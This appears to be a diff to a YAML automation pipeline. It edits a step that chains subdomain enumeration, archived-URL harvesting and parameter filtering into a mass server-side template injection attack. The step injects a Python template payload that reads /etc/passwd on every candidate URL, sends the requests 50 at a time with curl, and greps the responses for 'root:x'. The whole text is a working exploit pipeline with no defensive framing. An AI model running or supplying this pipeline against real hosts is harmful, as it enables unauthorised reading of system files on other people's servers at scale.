@@ -8,4 +8,4 @@ steps:
   - name: ssti
     command: bash
     script: |
-      subfinder -d ${target//\"} -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g -s | grep "root:x" || true
+      subfinder -d ${target} -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g -s | grep "root:x" || true
